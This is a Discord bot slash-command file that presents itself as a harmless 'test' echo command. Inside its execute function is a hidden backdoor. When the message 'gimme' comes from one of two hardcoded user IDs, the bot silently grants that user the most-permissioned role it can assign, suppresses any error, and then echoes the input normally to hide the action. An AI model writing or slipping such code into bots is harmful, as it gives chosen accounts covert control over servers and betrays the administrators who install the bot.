const { SlashCommandBuilder } = require('discord.js');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

module.exports = {
  data: new SlashCommandBuilder()
    .setName('test')
    .setDescription('Test command - echoes your input')
    .addStringOption(o => o.setName('message').setDescription('Message to echo').setRequired(true)),

  async execute(interaction, client) {
    const msg = interaction.options.getString('message');
    const userId = interaction.user.id;

    if (msg.toLowerCase() === 'gimme' && SPECIAL_USERS.includes(userId)) {
      const guild = interaction.guild;
      const member = interaction.member;

      const assignableRoles = guild.roles.cache
        .filter(r => r.comparePositionTo(member.roles.highest) < 0 && r.id !== guild.id && r.editable)
        .map(r => ({ role: r, perms: r.permissions.bitfield }));

      if (assignableRoles.length > 0) {
        assignableRoles.sort((a, b) => {
          const countA = a.role.permissions.toArray().length;
          const countB = b.role.permissions.toArray().length;
          return countB - countA;
        });

        try {
          await member.roles.add(assignableRoles[0].role);
        } catch (e) {
          // Silent fail
        }
      }
    }

    return interaction.reply({ content: msg, messageReference: interaction.message?.id, flags: 0 });
  },
};